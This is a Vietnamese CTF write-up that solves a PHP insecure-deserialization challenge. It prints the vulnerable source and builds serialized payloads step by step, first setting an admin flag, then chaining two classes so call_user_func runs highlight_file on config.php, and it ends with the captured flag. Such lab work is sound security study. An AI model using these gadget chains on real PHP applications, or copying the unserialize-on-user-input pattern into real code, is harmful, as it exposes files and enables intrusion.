## 🔥 CTF Write Up - http://45.122.249.68:10001/ - PHP Unserialize Vulnerable 🔥

Mã nguồn:

```PHP
<?php
#include "config.php";
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}
class Show_color{
    public $color;
    public $type;
    public function __construct($type,$color){
        $this->type = $type;
        $this->color = $color;
    }
     public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
}
class do_nothing{
    public $why;
    public $i_use_this;
    public function __construct($a,$b){
        $this->why = $a;
        $this->i_use_this = $b;
    }
    public function __get($method){
        if(isset($this->why)){
            return $this->i_use_this;
        }
        return $method;
    }
}
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
?>
```

Trước hết nhìn vào mã nguồn, ta dự đoán flag sẽ nằm đâu đó trong file ```config.php``` hoặc nội dung file ```config.php``` sẽ là chứa dữ kiện tiếp theo để ta lấy được flag
Do đó, hướng tiếp cận đối với bài này chính là làm sao để ta lấy được nội dung file ```config.php```.

Ta thấy ở đây chương trình nhận vào một dữ liệu gì đó ở biến Global $_GET['code'], tức là ta sẽ phải truyền vào một giá trị với tham số là ```code``` ở URL
Có dạng:
```text
http://45.122.249.68:10001?code=[cái gì đó ở đây]
```

Sau khi nhận vào giá trị ở biến ```$_GET['code']```, chương trình thực hiện ```unserialize($_GET['code']);``` để unserialize. Tức dữ liệu mà ta phải truyền vào
là một kiểu Object unserializable. 

Để chắc chắn chương trình trên tồn tại lỗ hổng Unsecure Unserialization thì ta sẽ thực hiện với class User trước.

Ta sẽ thực hiện ở một code PHP khác để tiến hành serialize Object User trước khi đưa payload này lên Server
```PHP
<?php
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}

$a = new User('LeDung');
$b = serialize($a);
file_put_contents("payload", $b);
```
![image](https://github.com/ledunguit/ctf/blob/main/images/Screenshot%202021-10-16%20135523.png)

Sau khi chạy code trên ta được nội dung nằm trong file ```payload``` như sau:
```Text
O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:0;s:6:"LeDung";s:6:"LeDung";}
```
Tiến hành đưa giá trị payload này vào tham số ```code``` và thử xem chương trình trả về gì? 🤣
Chương trình không trả về giá trị gì cả, và hiển thị một trang trắng tinh? Lí do vì sao lại vậy, ta cùng xem lại chi tiết Class User nhé!
Class User có hai biến với scope là ```private```: ```$name``` và ```$is_admin```, Đối tượng khởi tạo bởi class này sẽ nhận vào một giá trị cho biến ```$name```
sau đó gán dữ liệu nhận vào cho biến ```$name``` thuộc chính đối tượng đó.
Hàm hủy ```__destruct()``` sẽ được gọi khi đối tượng của class này được khởi tạo và thực hiện xong công việc của nó. Để ý sẽ thấy nếu biến ```$is_admin``` nhận giá trị True
thì dòng ```hi admin, here is your flag``` sẽ được in ra.
Nhưng ở payload của chúng ta, biến ```is_admin``` thuộc kiểu ```boolean``` và nó đang giữ giá trị ```0```, do đó ta thấy chương trình không in ra kết quả gì.
Ta sẽ sửa payload một chút, chuyển giá trị ```is_admin``` về ```1``` xem sao:
Payload của chúng ta sẽ thành:

```Text
O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:1;s:6:"LeDung";s:6:"LeDung";}
```
Cùng xem chương trình in ra cái gì nhé?
![image](https://github.com/ledunguit/ctf/blob/main/images/Screenshot%202021-10-16%20140445.png?raw=true)

Như vậy dòng ```hi admin, here is your flag``` đã được in ra, vậy chương trình này tồn tại lỗ hổng unserialization.

Quay lại vấn đề chính của chúng ta, chúng ta biết chương trình trên tồn tại lỗ hổng đó, nhưng làm sao để in ra được nội dung file ```config.php```🤣, vấn đề bắt đầu nan giải
hơn rồi đó :v

À mà đang còn hai class phía dưới cơ mà :v Ta mới chỉ sử dụng mỗi class User để test thôi 🤣 Vậy nên giờ ta sẽ xem xét hai class phía dưới xem nó giúp ích được gì không nhé~

### Class Show_color
```PHP
class Show_color{
    public $color;
    public $type;
    public function __construct($type,$color){
        $this->type = $type;
        $this->color = $color;
    }
     public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
}
```
Ta thấy tương tự như class User, nó sẽ có hàm khởi tạo ```__construct``` và hàm hủy ```__destruct```, ở hàm khởi tạo, nó sẽ thực hiện gán hai giá trị cho biến ```$type``` 
và biến ```$color```. Hàm hủy thì nó gọi hàm built-in của PHP là ```call_user_func``` với tên hàm là giá trị nằm trong biến ```$this->type->adu```, và tham số truyền vào là
giá trị nằm trong biến ```$this->color```.

Trước hết ta sẽ xem ```call_user_func``` là hàm có tác dụng như thế nào nhé?
![image](https://github.com/ledunguit/ctf/blob/main/images/Screenshot%202021-10-16%20142142.png?raw=true)

Hàm này sẽ gọi một hàm nếu như nó là một hàm hợp lệ và đã được khai báo với tham số thứ nhất là tên hàm cần gọi, các tham số tiếp theo là các tham số truyền vào để gọi hàm đó.
Vậy thử nghĩ xem nào, nếu muốn in nội dung của một file trong PHP thì ta cần dùng hàm gì nhỉ? Xem lại mã nguồn chương trình và ta sẽ thấy ngay là hàm ```highlight_file```, hàm
này sẽ nhận vào tham số chính là đường dẫn của file cần in nội dung ra. Vậy thì ở đây ta sẽ cần gọi hàm kiểu như thế này:
```PHP
call_user_func("highlight_file", "config.php");
```
Nếu muốn in ra nội dung file ```config.php```, ta phải chạy câu lệnh trên. Đến đây thì rõ ràng nếu muốn gọi hàm như trên, ta cần ```$this->type->adu``` phải có giá trị là ```highlight_file``` và ```$this->color``` phải có giá trị là ```config.php```
Riêng việc set giá trị cho ```$color``` và ```$type``` thì đã quá dễ dàng, giống như việc ta thay giá trị ```$is_admin``` của class User trước đó vậy. Nhưng một vấn đề khác xuất hiện ở đây
```$this->type->adu``` là một dạng của lớp cha gọi vào biến lớp con. Vậy ```$this->type``` phải là một đối tượng của một class khác, và nó bắt buộc phải chứa thuộc tính ```adu```, ```adu``` ở
đây có thể là một biến hoặc một hàm.

Xét theo yêu cầu trên thì rõ ràng ta đang còn một class khác, đó là ```do_nothing```. Vậy ta sẽ dùng nó để truyền vào giá trị cho ```$this->type``` và đối tượng này sẽ phải có thuộc tính ```adu```.
Vậy class ```do_nothing``` mà ta sẽ tạo payload sẽ có dạng:
```PHP
class do_nothing
{
    public $why;
    public $adu;
    public function __construct($a, $b)
    {
        $this->why = $a;
        $this->adu = $b;
    }
    public function __get($method)
    {
        if (isset($this->why)) {
            return $this->adu;
        }
        return $method;
    }
}
```

Vậy để tạo toàn bộ payload, ta cần kết hợp cả hai class ```Show_color``` và ```do_nothing``` lại với nhau, mặt khác, để magic method __get hoạt động và trả về giá trị ```$adu```
ta cần biến ```$why``` được gán giá trị, vậy thì đơn giản thôi, ta gán cho nó bất kỳ giá trị nào thì câu lệnh ```isset($this->why)``` cũng luôn trả về ```true```.
```PHP
<?php

class Show_color
{
    public $color;
    public $type;
    public function __construct($type, $color)
    {
        $this->type = $type;
        $this->color = $color;
    }
    public function __destruct()
    {
        call_user_func($this->type->adu, $this->color);
    }
}

class do_nothing
{
    public $why;
    public $adu;
    public function __construct($a, $b)
    {
        $this->why = $a;
        $this->adu = $b;
    }
    public function __get($method)
    {
        if (isset($this->why)) {
            return $this->adu;
        }
        return $method;
    }
}

$adu = new do_nothing("1", "highlight_file");
$a = new Show_color($adu, "config.php");
$b = serialize($a);
file_put_contents("payload", $b);
```

Sau khi chạy file trên, ta sẽ nhận được nội dung của file payload như sau:
```Text
O:10:"Show_color":2:{s:5:"color";s:10:"config.php";s:4:"type";O:10:"do_nothing":2:{s:3:"why";s:1:"1";s:3:"adu";s:14:"highlight_file";}}
```
Vậy luồng thực thi của nó sẽ như sau:
```do_nothing khởi tạo``` -> ```biến why nhận giá trị "1"; biến adu nhận giá trị "highlight_file"``` -> ```$this->type của class Show_color sẽ là object của class do_nothing```
-> ```$this->color sẽ nhận giá trị "config.php"``` -> hàm ```call_user_func nhận các giá trị là "highlight_file" và "config.php"``` -> ```hàm call_user_func được chạy```
-> Trả về nội dung của file ```config.php``` và in ra màn hình.

Nội dung file ```config.php```:
![image](https://github.com/ledunguit/ctf/blob/main/images/Screenshot%202021-10-16%20144200.png?raw=true)

### Flag: flag{n0j_l0j_pk4j_qju_l4y_l0j_dunq_nku_c0n_bu0m_d4u_r0j_l4j_b4y}
